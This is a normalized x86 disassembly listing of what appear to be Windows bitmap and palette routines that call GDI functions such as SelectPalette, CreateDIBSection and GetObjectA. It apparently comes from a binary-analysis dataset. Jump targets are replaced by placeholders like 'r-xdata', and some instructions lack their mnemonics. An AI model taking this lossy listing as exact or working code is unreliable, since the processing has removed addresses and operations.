je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_428b20
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_428d60
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42876c
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_424d5c
sub_428ba0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_428d60
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42793c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42882c
sub_428be8
push ebx
mov ebx eax
mov eax ebx
call sub_428d50
mov eax ebx
call sub_428d60
mov edx ebx
mov eax ebx
call sub_42882c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_428c0c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_428c8c
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423580
mov eax ebx
call sub_428c5c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_428ba0
xor edx edx
pop ecx
call sub_424998
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_428cdc
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_428e60
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_427d04
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_428d60
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41a8c0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_428de3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_428e00
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_428d50
mov eax ebx
call sub_428d60
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_428c8c
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4283cc
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4278c0
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_428e60
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_4254f4
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4278c0
push 0x0
call GetDC
call sub_424e04
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_428f18
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424ccc
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_42876c
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_428d50
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402ba4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428f9c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41a8a0
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_429650
pop esi
pop ebx
retn
sub_428fc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429047
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403340
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4290a7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_427b34
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_427b30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4290ae
push rw-data
call LeaveCriticalSection
retn
sub_4290c0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_429650
pop edx
pop edi
pop esi
pop ebx
retn
sub_4290e8
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026dc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_429605
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4295d8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402ba4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424ce4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ab3c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402ba4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41aacc
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_424f74
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424f94
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41aacc
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424e04
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_429553
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_42523c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026dc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4294bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41aacc
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42948f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4254f4
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cc74
call sub_424ce4
jmp r-xdata
xor eax eax
push ebp
push sub_429522
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41aacc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429496
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42955a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cc74
call sub_424ce4
jmp r-xdata
sub_429496
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42955a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402ba4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4295ef
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4254f4
mov [ ebp - 0x30 ] eax
sub_42960c
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428fc0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429650
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428d50
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41aacc
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402ba4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428fc0
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4290e8
call sub_424ce4
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4296c0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_428d50
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402ba4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_428368
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42975b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429784
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_428c0c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_428d50
mov eax esi
call sub_428e60
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_428d50
mov eax esi
call sub_428e60
mov eax esi
call sub_428cdc
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_428368
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_42876c
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428fc0
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428fc0
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_427d04
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4298bc
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_428d60
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_42876c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429910
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_428d60
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_42876c
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429990
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_428d50
mov eax ebx
call sub_428d60
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_427d04
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429a27
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427bfc
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422cb0
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_429a2c
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403984
call sub_4039d8
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427bfc
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429a64
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_428d60
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42876c
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_429ab4
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_428d60
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
